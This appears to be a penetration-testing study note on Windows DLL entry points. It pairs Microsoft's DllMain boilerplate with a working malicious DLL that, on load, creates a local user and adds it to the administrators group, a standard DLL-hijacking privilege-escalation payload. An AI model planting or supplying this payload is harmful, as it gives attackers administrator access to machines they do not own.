> C++ is a high-level, general-purpose programming language created by Danish computer scientist Bjarne Stroustrup.


#Windows_Privilege_Escalation 

Basic DLL C++ boilerplate code from Microsoft
```c++
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
- Each DLL can have an optional _entry point function_ named _DllMain_, which is executed when processes or threads attach the DLL. 
- This function generally contains four cases named: 
	- `DLL_PROCESS_ATTACH`
	- `DLL_THREAD_ATTACH`
	- `DLL_THREAD_DETACH`
	- `DLL_PROCESS_DETACH`
- These cases handle situations when the DLL is loaded or unloaded by a process or thread. 
- They are commonly used to perform initialization tasks for the DLL or tasks related to exiting the DLL. 
- If a DLL doesn't have a _DllMain_ entry point function, it only provides resources.

C++ DLL to add user to administrators local group 
```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user hentaisalesman password123! /add");
  	    i = system ("net localgroup administrators hentaisalesman /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
- Since we use Windows specific data types such as `BOOL`, we need the `include` statement for the header file `windows.h`
